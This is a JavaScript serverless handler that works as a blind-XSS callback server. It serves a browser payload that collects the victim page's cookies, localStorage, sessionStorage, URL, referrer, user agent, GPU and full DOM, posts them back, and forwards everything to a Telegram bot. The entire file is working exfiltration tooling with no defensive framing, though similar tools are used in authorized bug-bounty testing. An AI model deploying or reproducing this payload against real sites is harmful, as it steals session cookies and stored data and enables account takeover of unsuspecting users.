export default async function handler(req, res) {
  if (req.method === 'POST') {
    const data = req.body;
    
    // Send to Telegram
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    const message = `🚨 XSS Payload Executed
URI: ${data.uri}
Origin: ${data.origin}
Cookies: ${data.cookies}
Referrer: ${data.referrer}
User-Agent: ${data['user-agent']}
Language: ${data.lang}
GPU: ${data.gpu}
LocalStorage: ${JSON.stringify(data.localstorage)}
SessionStorage: ${JSON.stringify(data.sessionstorage)}
DOM Length: ${data.dom?.length || 0} chars`;
    
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });
    
    return res.status(200).json({ status: 'received' });
  }
  
  res.setHeader('Content-Type', 'application/javascript');
  res.setHeader('Access-Control-Allow-Origin', '*');
  
  const payload = `
var data = {};

function safe(val) {
  return val !== undefined ? val : "";
}

function sendData(payload) {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "/", true);
  xhr.setRequestHeader("Content-type", "application/json");
  xhr.send(JSON.stringify(payload));
}

function collectData() {
  try { data.uri = safe(location.toString()); } catch(e) { data.uri = ""; }
  try { data.cookies = safe(document.cookie); } catch(e) { data.cookies = ""; }
  try { data.referrer = safe(document.referrer); } catch(e) { data.referrer = ""; }
  try { data["user-agent"] = safe(navigator.userAgent); } catch(e) { data["user-agent"] = ""; }
  try { data.origin = safe(location.origin); } catch(e) { data.origin = ""; }
  try { 
    var lang = navigator.language || navigator.userLanguage;
    data.lang = safe(lang);
  } catch(e) { data.lang = ""; }
  
  try {
    var canvas = document.createElement("canvas");
    var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    var gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    data.gpu = safe(gpu);
  } catch(e) { data.gpu = ""; }
  
  try { data.localstorage = window.localStorage; } catch(e) { data.localstorage = ""; }
  try { data.sessionstorage = window.sessionStorage; } catch(e) { data.sessionstorage = ""; }
  try { data.dom = safe(document.documentElement.outerHTML); } catch(e) { data.dom = ""; }
  
  sendData(data);
}

if (document.readyState === "complete") {
  collectData();
} else {
  if (window.addEventListener) {
    window.addEventListener("load", collectData, false);
  } else if (window.attachEvent) {
    window.attachEvent("onload", collectData);
  }
}
`;
  
  res.send(payload);
}

